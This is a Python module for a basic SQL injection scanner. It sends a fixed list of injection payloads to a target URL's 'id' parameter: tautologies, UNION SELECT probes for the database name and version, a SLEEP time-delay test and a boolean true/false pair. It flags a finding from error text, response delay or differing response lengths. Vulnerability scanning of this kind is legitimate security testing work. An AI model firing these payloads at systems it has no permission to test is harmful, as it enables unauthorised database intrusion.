"""
SQL Injection Detector Module
"""

import requests
from typing import List, Dict
import time


class SQLiDetector:
    """SQL Injection vulnerability detector"""
    
    def __init__(self, target: str):
        self.target = target
        self.findings = []
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "' OR '1'='1' /*",
            "admin' --",
            "' UNION SELECT DATABASE()--",
            "' UNION SELECT VERSION()--",
        ]
    
    def detect(self) -> List[Dict]:
        """Detect SQL injection vulnerabilities"""
        # Test time-based detection
        self._test_time_based()
        # Test error-based detection
        self._test_error_based()
        # Test boolean-based detection
        self._test_boolean_based()
        
        return self.findings
    
    def _test_time_based(self):
        """Time-based SQL injection testing"""
        time_payload = "' AND SLEEP(5)--"
        try:
            start = time.time()
            response = requests.get(f"{self.target}?id={time_payload}", timeout=10)
            elapsed = time.time() - start
            
            if elapsed > 5:
                self.findings.append({
                    'vulnerability': 'SQL Injection (Time-based)',
                    'severity': 'HIGH',
                    'url': self.target,
                    'method': 'Time-based detection',
                    'payload': time_payload,
                    'detection_time': elapsed
                })
        except:
            pass
    
    def _test_error_based(self):
        """Error-based SQL injection testing"""
        for payload in self.payloads:
            try:
                response = requests.get(f"{self.target}?id={payload}", timeout=5)
                if 'SQL' in response.text or 'syntax' in response.text.lower():
                    self.findings.append({
                        'vulnerability': 'SQL Injection (Error-based)',
                        'severity': 'CRITICAL',
                        'url': self.target,
                        'method': 'Error-based detection',
                        'payload': payload,
                        'response_snippet': response.text[:200]
                    })
            except:
                pass
    
    def _test_boolean_based(self):
        """Boolean-based SQL injection testing"""
        true_payload = "' OR '1'='1"
        false_payload = "' OR '1'='2"
        
        try:
            response_true = requests.get(f"{self.target}?id={true_payload}", timeout=5)
            response_false = requests.get(f"{self.target}?id={false_payload}", timeout=5)
            
            if len(response_true.text) != len(response_false.text):
                self.findings.append({
                    'vulnerability': 'SQL Injection (Boolean-based)',
                    'severity': 'HIGH',
                    'url': self.target,
                    'method': 'Boolean-based detection',
                    'true_payload': true_payload,
                    'false_payload': false_payload
                })
        except:
            pass